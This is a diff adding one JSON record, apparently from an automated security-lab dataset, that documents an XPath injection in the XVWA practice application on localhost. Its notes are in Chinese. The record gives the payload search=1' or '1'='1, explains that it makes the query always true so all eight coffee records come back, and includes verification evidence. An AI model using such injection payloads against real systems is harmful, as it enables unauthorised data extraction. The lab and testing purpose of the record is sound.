@@ -1,0 +1,14 @@
+[
+  {
+    "id": "auto-20261030175512",
+    "context": "XVWA XPath 注入关：POST 参数 search 直接拼进 XPath 查询，无过滤。正常 search=<数字ID> 返回单条，注入 ' or '1'='1 使条件恒真返回全表。",
+    "reference_payload": "POST search=1' or '1'='1 (原正常 search=1 只回1条,注入后回8条全表)",
+    "principle": "XPath 布尔注入：search=1' or '1'='1 使 XPath 谓词恒真，绕过 ID 精确匹配返回全部节点（8条咖啡记录）",
+    "source": "xvwa",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8084/xvwa/vulnerabilities/xpath/",
+      "match": "Café Bombón"
+    }
+  }
+]
